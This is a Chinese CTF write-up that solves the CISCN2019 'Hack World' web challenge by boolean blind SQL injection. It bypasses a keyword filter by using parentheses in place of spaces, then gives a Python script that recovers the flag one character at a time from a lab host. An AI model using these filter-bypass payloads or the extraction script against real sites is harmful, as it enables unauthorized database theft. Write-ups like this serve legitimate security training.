# [CISCN2019 华北赛区 Day2 Web1]Hack World 1

- 经测试未发现注入点，而且对某些关键字进行了过滤

> <img src="../../IMG2/Screenshot 2024-06-06 194018.png">

- 进行Fuzz测试，发现很多关键字都被过滤了，但是括号没有过滤，所以可以用括号代替空格

> <img src="../../IMG2/Screenshot 2024-06-06 195209.png">

- 确认存在注入点，这道题已经告诉了数据表与字段，则可以直接查询数据。

`(select(1)from(flag))`

> <img src="../../IMG2/Screenshot 2024-06-06 201807.png">

`(select(2)from(flag))`

> <img src="../../IMG2/Screenshot 2024-06-06 201911.png">

- 这里不能直接查询flag，参数id的值不能为字符，考虑到查询失败时会返回 `bool(false)` ，我们可以使用布尔盲注，这里我们挨个查询flag每个字符的ascii码，如果正确，则会返回 `Hello, glzjin wants a girlfriend.` ，第一个字符一般都是f。

`(select(ascii(mid(flag,1,1))=102)from(flag))`

> <img src="../../IMG2/Screenshot 2024-06-06 202605.png">

- 查询成功，确认第一个字符为f，接下来的内容使用脚本完成，得到flag

```py
import requests
import string

url = 'http://b64e2d49-8ca0-4102-a2fd-fa16acc7fbb0.node5.buuoj.cn:81/index.php'
strings = string.printable
flag = ''
for count in range(1, 60):
    for char in strings:
        payload = f'(select(ascii(mid(flag,{count},1))={ord(char)})from(flag))'
        response = requests.post(url, {'id': payload})
        if 'Hello' in response.text:
            flag += char
            print(flag)
```

> <img src="../../IMG2/Screenshot 2024-06-06 205940.png">